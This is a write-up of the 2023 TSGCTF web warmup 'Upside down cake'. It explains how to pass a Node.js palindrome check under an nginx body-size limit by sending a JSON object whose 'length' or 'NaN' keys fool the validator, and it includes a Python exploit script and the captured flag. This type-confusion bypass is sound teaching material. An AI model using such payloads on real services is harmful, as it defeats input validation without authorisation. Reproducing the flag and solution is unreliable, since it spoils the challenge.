---
title: 2023 TSGCTF - Upside down cake
author: thanguyen165
date: 2023-11-04 00:00:00 +0700
categories: [Write-ups, 2023_TSGCTF]
tags: [Web Exploitation, write-ups]
---

* 100 points / 127 solves
* Author: hakatashi
* tag: warmup

## Description

> I checked 413 times to see if the settings are correct.

### Attached

[upside-down_cake.zip](./attached/upside-down_cake.zip)

```mjs
import {serve} from '@hono/node-server';
import {serveStatic} from '@hono/node-server/serve-static';
import {Hono} from 'hono';

const flag = process.env.FLAG ?? 'DUMMY{DUMMY}';

const validatePalindrome = (string) => {
	if (string.length < 1000) {
		return 'too short';
	}

	for (const i of Array(string.length).keys()) {
		const original = string[i];
		const reverse = string[string.length - i - 1];

		if (original !== reverse || typeof original !== 'string') {
			return 'not palindrome';
		}
	}

	return null;
}

const app = new Hono();

app.get('/', serveStatic({root: '.'}));

app.post('/', async (c) => {
	const {palindrome} = await c.req.json();
	const error = validatePalindrome(palindrome);
	if (error) {
		c.status(400);
		return c.text(error);
	}
	return c.text(`I love you! Flag is ${flag}`);
});

app.port = 12349;

serve(app);
```
{: file="main.mjs" }

## Analyzation

In this challenge, we have to pass the checker ```validatePalindrome(palindrome)``` to get flag

```mjs
const validatePalindrome = (string) => {
	if (string.length < 1000) {
		return 'too short';
	}

	for (const i of Array(string.length).keys()) {
		const original = string[i];
		const reverse = string[string.length - i - 1];

		if (original !== reverse || typeof original !== 'string') {
			return 'not palindrome';
		}
	}

	return null;
}
```

Firstly, I thought that just post a string length 1000 and get flag. But not so fast like that, check ```nginx.conf``` file

```conf
events {
	worker_connections 1024;
}

http {
	server {
		listen 0.0.0.0:12349;
		client_max_body_size 100;
		location / {
			proxy_pass http://app:12349;
			proxy_read_timeout 5s;
		}
	}
}
```
{: file="nginx.conf" }

So we must post a string with length < 100, but bypass the checker. Sounds impossible...

Hmm...

## Vulnerability

Who said that only string is allowed?

## Exploitation

We can post an object, or an array.

Array dont work here, because it wont pass the length condition.

We need a data type that dont have length attribute.

That's object, aka map in C++, dictionary in Python.

### Way 1

With an object, ```string.length``` returns ```undefined```, an the condition ```string.length < 1000``` returns ```true```. Pass!

But there is a problem with the loop. The index ```string.length - i - 1``` is inaccessible.

Slow down a little bit, ```string.length - i - 1``` equals to ```NaN```, so just give an object attribute ```NaN```, done!

This is the data will be post to the site.

```py
data = {
	"0": "a",
	"NaN": "a"
}
payload = { "palindrome": data}
```

### Way 2

This is an object, so its attributes are accessible by dot operator, too! It tooks me so many time to realise this.

```py
data = {
    "0": "a",
    "999": "a",
    "length": "1000"
}
payload = { "palindrome": data}
```

***Note***: Python is different from javascript.

```py
data = {
    "0": "a",
    "999": "a",
    "length": "1000"
}

print(data["length"]) # print 1000
print(len(data))	  # print 3
print(data.__len__()) # print 3
```

## Solution

```py
import requests

# URL = "http://localhost:12349/"
URL = "http://34.84.176.251:12349/"
HEADERS = {'Content-Type': 'application/json'}

data = {
    "0": "a",
    "999": "a",
    "length": "1000"
}
payload = { "palindrome": data}

response = requests.post(URL, json=payload, headers=HEADERS)
print(response.content)
```

The flag is

```
TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}
```